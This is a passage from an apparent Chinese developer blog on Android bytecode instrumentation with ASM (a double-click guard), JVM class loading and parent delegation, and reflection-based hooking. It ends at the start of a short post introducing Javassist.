<span class=\"token punctuation\">(</span>methodNode <span class=\"token keyword\">in</span> methods<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token keyword\">val</span> methodNameWithDesc <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span>nameWithDesc\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token keyword\">val</span> argumentTypes <span class=\"token operator\">=</span> Type<span class=\"token punctuation\">.</span><span class=\"token function\">getArgumentTypes</span><span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span>desc<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">val</span> viewArgumentIndex <span class=\"token operator\">=</span> argumentTypes<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOfFirst</span> <span class=\"token punctuation\">&#123;</span>\n                            it<span class=\"token punctuation\">.</span>descriptor <span class=\"token operator\">==</span> ViewDescriptor\n                        <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">?:</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n                        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>viewArgumentIndex <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                            <span class=\"token keyword\">val</span> instructions <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span>instructions\n                            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>instructions <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> instructions<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                                <span class=\"token keyword\">val</span> list <span class=\"token operator\">=</span> <span class=\"token function\">InsnList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n                                    <span class=\"token function\">VarInsnNode</span><span class=\"token punctuation\">(</span>\n                                        Opcodes<span class=\"token punctuation\">.</span>ALOAD<span class=\"token punctuation\">,</span> <span class=\"token function\">getVisitPosition</span><span class=\"token punctuation\">(</span>\n                                            argumentTypes<span class=\"token punctuation\">,</span>\n                                            viewArgumentIndex<span class=\"token punctuation\">,</span>\n                                            methodNode<span class=\"token punctuation\">.</span>isStatic\n                                        <span class=\"token punctuation\">)</span>\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n                                    <span class=\"token function\">MethodInsnNode</span><span class=\"token punctuation\">(</span>\n                                        Opcodes<span class=\"token punctuation\">.</span>INVOKESTATIC<span class=\"token punctuation\">,</span>\n                                        config<span class=\"token punctuation\">.</span>formatDoubleCheckClass<span class=\"token punctuation\">,</span>\n                                        config<span class=\"token punctuation\">.</span>doubleCheckMethodName<span class=\"token punctuation\">,</span>\n                                        config<span class=\"token punctuation\">.</span>doubleCheckMethodDescriptor\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span>\n                                <span class=\"token keyword\">val</span> labelNode <span class=\"token operator\">=</span> <span class=\"token function\">LabelNode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token function\">JumpInsnNode</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>IFNE<span class=\"token punctuation\">,</span> labelNode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token function\">InsnNode</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>RETURN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>labelNode<span class=\"token punctuation\">)</span>\n                                instructions<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>list<span class=\"token punctuation\">)</span>\n                            <span class=\"token punctuation\">&#125;</span>\n                        <span class=\"token punctuation\">&#125;</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span>ClassWriter<span class=\"token punctuation\">.</span>COMPUTE_MAXS<span class=\"token punctuation\">)</span>\n                classNode<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">return</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> byteArray\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> ClassNode<span class=\"token punctuation\">.</span><span class=\"token function\">isHookPoint</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">,</span> methodNode<span class=\"token operator\">:</span> MethodNode<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> myInterfaces <span class=\"token operator\">=</span> interfaces\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>myInterfaces<span class=\"token punctuation\">.</span><span class=\"token function\">isNullOrEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">val</span> extraHookMethodList <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>hookPointList\n        extraHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>myInterfaces<span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span>it<span class=\"token punctuation\">.</span>interfaceName<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> methodNode<span class=\"token punctuation\">.</span>nameWithDesc <span class=\"token operator\">==</span> it<span class=\"token punctuation\">.</span>methodSign<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">findHookPointLambda</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>InvokeDynamicInsnNode<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> onClickListenerLambda <span class=\"token operator\">=</span> findLambda <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">val</span> nodeName <span class=\"token operator\">=</span> it<span class=\"token punctuation\">.</span>name\n            <span class=\"token keyword\">val</span> nodeDesc <span class=\"token operator\">=</span> it<span class=\"token punctuation\">.</span>desc\n            <span class=\"token keyword\">val</span> find <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>hookPointList<span class=\"token punctuation\">.</span><span class=\"token function\">find</span> <span class=\"token punctuation\">&#123;</span> point <span class=\"token operator\">-></span>\n                nodeName <span class=\"token operator\">==</span> point<span class=\"token punctuation\">.</span>methodName <span class=\"token operator\">&amp;&amp;</span> nodeDesc<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span>point<span class=\"token punctuation\">.</span>interfaceSignSuffix<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">return</span><span class=\"token label symbol\">@findLambda</span> find <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> onClickListenerLambda\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">getInputTypes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Set<span class=\"token operator\">&lt;</span>QualifiedContent<span class=\"token punctuation\">.</span>ContentType<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> TransformManager<span class=\"token punctuation\">.</span>CONTENT_CLASS\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">getScopes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MutableSet<span class=\"token operator\">&lt;</span><span class=\"token keyword\">in</span> QualifiedContent<span class=\"token punctuation\">.</span>Scope<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">mutableSetOf</span><span class=\"token punctuation\">(</span>\n            QualifiedContent<span class=\"token punctuation\">.</span>Scope<span class=\"token punctuation\">.</span>PROJECT<span class=\"token punctuation\">,</span>\n            QualifiedContent<span class=\"token punctuation\">.</span>Scope<span class=\"token punctuation\">.</span>SUB_PROJECTS<span class=\"token punctuation\">,</span>\n<span class=\"token comment\">//            QualifiedContent.Scope.EXTERNAL_LIBRARIES</span>\n        <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>他自己封装了一个<code>BaseTransform</code>，把修改class的过程封装成了一个<code>modifierClass(byteArray: ByteArray): ByteArray</code>方法，让我们能更专注于修改类信息的过程。至于他是怎么封装的也可以课下了解，这里我们着重讲他如何使用asm。</p>\n<p>我们首先分析他的逻辑，无外乎两点：</p>\n<ul>\n<li>找到hook点（ButterKnife的onClick注解，View#setOnClickListener）</li>\n<li>在hook点插入逻辑代码</li>\n</ul>\n<blockquote>\n<p>这里自由发挥吧，随便讲点就差不多了。</p>\n</blockquote>\n<h2 id=\"虚拟机类加载机制\"><a href=\"#虚拟机类加载机制\" class=\"headerlink\" title=\"虚拟机类加载机制\"></a>虚拟机类加载机制</h2><p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/13202633-3cb11d1712a9efc9.webp\" alt=\"13202633-3cb11d1712a9efc9\"></p>\n<h3 id=\"类的生命周期\"><a href=\"#类的生命周期\" class=\"headerlink\" title=\"类的生命周期\"></a>类的生命周期</h3><h4 id=\"加载-Loading\"><a href=\"#加载-Loading\" class=\"headerlink\" title=\"加载 Loading\"></a>加载 Loading</h4><blockquote>\n<p>虚拟机从io流读取类文件到内存中。</p>\n<p>加载过程主要完成三件事情：</p>\n<ol>\n<li>通过类的全限定名来获取定义此类的二进制字节流</li>\n<li>将这个类字节流代表的静态存储结构转为方法区的运行时数据结构</li>\n<li>在堆中生成一个代表此类的java.lang.Class对象，作为访问方法区这些数据结构的入口。</li>\n</ol>\n<p>这个过程主要就是类加载器完成。</p>\n</blockquote>\n<h4 id=\"验证-Verification\"><a href=\"#验证-Verification\" class=\"headerlink\" title=\"验证 Verification\"></a>验证 Verification</h4><blockquote>\n<p>此阶段主要确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机的自身安全。</p>\n<ol>\n<li>文件格式验证：基于字节流验证。</li>\n<li>元数据验证：基于<em><strong>方法区</strong></em>的存储结构验证。</li>\n<li>字节码验证：基于方法区的存储结构验证。</li>\n<li>符号引用验证：基于方法区的存储结构验证。</li>\n</ol>\n</blockquote>\n<h4 id=\"准备-Preparation\"><a href=\"#准备-Preparation\" class=\"headerlink\" title=\"准备 Preparation\"></a>准备 Preparation</h4><blockquote>\n<p>为类变量分配内存，并将其初始化为默认值。（此时为默认值，在初始化的时候才会给变量赋值）即在方法区中分配这些变量所使用的内存空间</p>\n</blockquote>\n<p>例如</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> value <span class=\"token operator\">=</span> <span class=\"token number\">12345</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>虽说value在代码中被初始化为5，但这时value的值仍然为0，变量要在初始化阶段才会被赋初值（如果有）。</p>\n<h4 id=\"解析-Resolution\"><a href=\"#解析-Resolution\" class=\"headerlink\" title=\"解析 Resolution\"></a>解析 Resolution</h4><blockquote>\n<p>把类型中的符号引用转换为直接引用。</p>\n<ul>\n<li>符号引用与虚拟机实现的布局无关，引用的目标并不一定要已经加载到内存中。各种虚拟机实现的内存布局可以各不相同，但是它们能接受的符号引用必须是一致的，因为符号引用的字面量形式明确定义在Java虚拟机规范的Class文件格式中。</li>\n<li>直接引用可以是指向目标的指针，相对偏移量或是一个能间接定位到目标的句柄。如果有了直接引用，那引用的目标必定已经在内存中存在</li>\n</ul>\n<p>主要有以下四种：</p>\n<ul>\n<li><p>类或接口的解析</p>\n</li>\n<li><p>字段解析</p>\n</li>\n<li><p>类方法解析</p>\n</li>\n<li><p>接口方法解析</p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"初始化-Initialization\"><a href=\"#初始化-Initialization\" class=\"headerlink\" title=\"初始化 Initialization\"></a>初始化 Initialization</h4><blockquote>\n<p>初始化阶段是执行类构造器<client>方法的过程。<client>方法是由编译器自动收集类中的类变量的赋值操作和静态语句块中的语句合并而成的。虚拟机会保证<client>方法执行之前，父类的<client>方法已经执行完毕。如果一个类中没有对静态变量赋值也没有静态语句块，那么编译器可以不为这个类生成<client>()方法。</p>\n<p>java中，对于初始化阶段，有且只有以下五种情况才会对要求类立刻“初始化”（加载，验证，准备，自然需要在此之前开始）：</p>\n<ul>\n<li><p>使用new关键字实例化对象、访问或者设置一个类的静态字段（被final修饰、编译器优化时已经放入常量池的例外）、调用类方法，都会初始化该静态字段或者静态方法所在的类。</p>\n</li>\n<li><p>初始化类的时候，如果其父类没有被初始化过，则要先触发其父类初始化。</p>\n</li>\n<li><p>使用java.lang.reflect包的方法进行反射调用的时候，如果类没有被初始化，则要先初始化。</p>\n</li>\n<li><p>虚拟机启动时，用户会先初始化要执行的主类（含有main）</p>\n</li>\n<li><p>jdk 1.7后，如果java.lang.invoke.MethodHandle的实例最后对应的解析结果是 REF_getStatic、REF_putStatic、REF_invokeStatic方法句柄，并且这个方法所在类没有初始化，则先初始化。</p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"卸载-Unloading\"><a href=\"#卸载-Unloading\" class=\"headerlink\" title=\"卸载 Unloading\"></a>卸载 Unloading</h4><blockquote>\n<p>在栈中不存在该类的实例与Class对象，且加载该类的classLoader失去gc roots时，换言之该类已经失去了gc roots，被gc回收，此时可以称作该类成功从jvm中卸载了，这条机制也是一些热修复方案的实现原理(其实现在大部分的热修复都是用JavaAgent实现类的热替换）。</p>\n</blockquote>\n<h3 id=\"类加载器-ClassLoader\"><a href=\"#类加载器-ClassLoader\" class=\"headerlink\" title=\"类加载器 (ClassLoader)\"></a>类加载器 (ClassLoader)</h3><h4 id=\"各司其职\"><a href=\"#各司其职\" class=\"headerlink\" title=\"各司其职\"></a>各司其职</h4><p>JVM 运行实例中会存在多个 ClassLoader，不同的 ClassLoader 会从不同的地方加载字节码文件。它可以从不同的文件目录加载，也可以从不同的 jar 文件中加载，也可以从网络上不同的服务地址来加载。</p>\n<p>JVM 中内置了三个重要的 ClassLoader，分别是 BootstrapClassLoader、ExtensionClassLoader 和 AppClassLoader。</p>\n<p>BootstrapClassLoader 负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME&#x2F;lib&#x2F;rt.jar 文件中，我们常用内置库 java.xxx.* 都在里面，比如 java.util.*、java.io.*、java.nio.<em>、java.lang.</em> 等等。这个 ClassLoader 比较特殊，它是由 C 代码实现的，我们将它称之为「根加载器」。</p>\n<p>ExtensionClassLoader 负责加载 JVM 扩展类，比如 swing 系列、内置的 js 引擎、xml 解析器 等等，这些库名通常以 javax 开头，它们的 jar 包位于 JAVA_HOME&#x2F;lib&#x2F;ext&#x2F;*.jar 中，有很多 jar 包。</p>\n<p>AppClassLoader 才是直接面向我们用户的加载器，它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录。我们自己编写的代码以及使用的第三方 jar 包通常都是由它来加载的。</p>\n<p>那些位于网络上静态文件服务器提供的 jar 包和 class文件，jdk 内置了一个 URLClassLoader，用户只需要传递规范的网络路径给构造器，就可以使用 URLClassLoader 来加载远程类库了。URLClassLoader 不但可以加载远程类库，还可以加载本地路径的类库，取决于构造器中不同的地址形式。ExtensionClassLoader 和 AppClassLoader 都是 URLClassLoader 的子类，它们都是从本地文件系统里加载类库。</p>\n<p>AppClassLoader 可以由 ClassLoader 类提供的静态方法 getSystemClassLoader() 得到，它就是我们所说的「系统类加载器」，我们用户平时编写的类代码通常都是由它加载的。当我们的 main 方法执行的时候，这第一个用户类的加载器就是 AppClassLoader。</p>\n<h4 id=\"ClassLoader-传递性\"><a href=\"#ClassLoader-传递性\" class=\"headerlink\" title=\"ClassLoader 传递性\"></a>ClassLoader 传递性</h4><p>程序在运行过程中，遇到了一个未知的类，它会选择哪个 ClassLoader 来加载它呢？虚拟机的策略是使用调用者 Class 对象的 ClassLoader 来加载当前未知的类。何为调用者 Class 对象？就是在遇到这个未知的类时，虚拟机肯定正在运行一个方法调用（静态方法或者实例方法），这个方法挂在哪个类上面，那这个类就是调用者 Class 对象。前面我们提到每个 Class 对象里面都有一个 classLoader 属性记录了当前的类是由谁来加载的。</p>\n<p>因为 ClassLoader 的传递性，所有延迟加载的类都会由初始调用 main 方法的这个 ClassLoader 全全负责，它就是 AppClassLoader。</p>\n<h4 id=\"双亲委派\"><a href=\"#双亲委派\" class=\"headerlink\" title=\"双亲委派\"></a>双亲委派</h4><p>双亲委派模型的工作过程为：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。</p>\n<p>使用双亲委派模型的好处在于<strong>Java类随着它的类加载器一起具备了一种带有优先级的层次关系</strong>。例如类java.lang.Object，它存在在rt.jar中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的Bootstrap ClassLoader进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有双亲委派模型而是由各个类加载器自行加载的话，如果用户编写了一个java.lang.Object的同名类并放在ClassPath中，那系统中将会出现多个不同的Object类，程序将混乱。因此，如果开发者尝试编写一个与rt.jar类库中重名的Java类，可以正常编译，但是永远无法被加载运行。</p>\n<p><img src=\"https://img-blog.csdn.net/20160506184936657\" alt=\"类加载器的双亲委派模型\"></p>\n<p><strong>双亲委派模型的系统实现</strong></p>\n<p>在java.lang.ClassLoader的loadClass()方法中，先检查是否已经被加载过，若没有加载则调用父类加载器的loadClass()方法，若父加载器为空则默认使用启动类加载器作为父加载器。如果父加载失败，则抛出ClassNotFoundException异常后，再调用自己的findClass()方法进行加载。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">protected</span> <span class=\"token keyword\">synchronized</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span><span class=\"token keyword\">boolean</span> resolve<span class=\"token punctuation\">)</span><span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//check the class has been loaded or not</span>\n    <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> <span class=\"token function\">findLoadedClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>parent <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                c <span class=\"token operator\">=</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n                c <span class=\"token operator\">=</span> <span class=\"token function\">findBootstrapClassOrNull</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassNotFoundException</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">//if throws the exception ,the father can not complete the load</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            c <span class=\"token operator\">=</span> <span class=\"token function\">findClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">resolveClass</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注意，双亲委派模型是Java设计者推荐给开发者的类加载器的实现方式，并不是强制规定的。大多数的类加载器都遵循这个模型，但是JDK中也有较大规模破坏双亲模型的情况，例如线程上下文类加载器（Thread Context ClassLoader）的出现，具体分析可以参见《深入理解Java虚拟机》。</p>\n<h2 id=\"Hook\"><a href=\"#Hook\" class=\"headerlink\" title=\"Hook\"></a>Hook</h2><h3 id=\"什么是Hook\"><a href=\"#什么是Hook\" class=\"headerlink\" title=\"什么是Hook\"></a>什么是Hook</h3><p>hook我认为更像是一种思想，而非一门单独的技术，其实就是通过一些旁门左道去通过代理修改别人的代码来达成一些意想不到的功能。而通过这些旁门左道其实是没办法随心所欲的修改代码的，所以我们需要从某些地方入手，这些地方被称作<strong>hook点</strong>。</p>\n<h3 id=\"怎么实现Hook\"><a href=\"#怎么实现Hook\" class=\"headerlink\" title=\"怎么实现Hook\"></a>怎么实现Hook</h3><p><img src=\"https://pic2.zhimg.com/80/v2-58f3800446ebb35fa8f38de1449a6af5_1440w.jpg\" alt=\"img\"></p>\n<p>那我就讲讲最基础的反射&#x2F;动态代理Hook吧。</p>\n<p>假如我们导入的外部库的网络请求部分有这么一段代码:</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">object</span> ServiceHolder <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> apiService<span class=\"token operator\">:</span> IWebServiceRepository <span class=\"token operator\">=</span> <span class=\"token function\">WebServiceRepository</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// WebServiceRepository</span>\n<span class=\"token keyword\">class</span> WebServiceRepository <span class=\"token operator\">:</span> IWebServiceRepository <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> BASE_URL <span class=\"token operator\">=</span> <span class=\"token string\">\"https://api.bifrost.kim\"</span>\n    \n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">getJsonData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Data <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// ...</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然而它的接口改了，我们需要修改一下请求的方式</p>\n<p>最简单的方法就是我们直接动态代理apiService，然后反射放进去。</p>\n<p>但InvocationHandler提供的动态代理也许不是很方便，只能在头部或者尾部插入逻辑。即便我们只需要修改部分字符串，就得重写整个网络请求方法的逻辑。</p>\n<p>那么更好的方法是什么呢，正是字节码插桩，我们使用字节码生成一个一样的类，再用asm稍微的修改这其中的部分逻辑即可。</p>\n<h3 id=\"利用LSposed实现全局Hook-有时间再研究\"><a href=\"#利用LSposed实现全局Hook-有时间再研究\" class=\"headerlink\" title=\"利用LSposed实现全局Hook (有时间再研究)\"></a>利用LSposed实现全局Hook (有时间再研究)</h3><blockquote>\n<p>有时间再说吧 我没研究（</p>\n</blockquote>\n"},{"title":"初试Javassist","date":"2021-11-07T15:08:07.000Z","author":"寒雨","hide":false,"summary":"列举了几种基本的javassist用法","_content":"\n今天看见群友做了个很有意思的东西: 拦截插件的setOp方法，彻底干掉后门插件\n\n经过一番交谈之后，我得知这是利用Javassist做的，利用javassist将setop方法的内容替换便可实现。之前也在b站看到过有大佬用javassist利用Integer装箱的特性整病毒注入的骚操作...于是我surf the internet，了解了一下这个库的用法，发现它与asm库的作用不是一般的相似。但它不同于asm库的是它的可操作空间是没有asm库大的，但它的操作会简单许多。我们甚至不需要了解字节码便能使用javassist实现一些修改字节码的功能。\n\n实验代码\n\n```kotlin\nfun main() {\n    javassistEdit()\n}\n\nfun javassistEdit() {\n    // 获取ctClass,因为是Kotlin文件所以带有Kt后缀\n    val ctClass = ClassPool.getDefault().get(\"kim.bifrost.coldrain.partice.TestClass\")\n    // 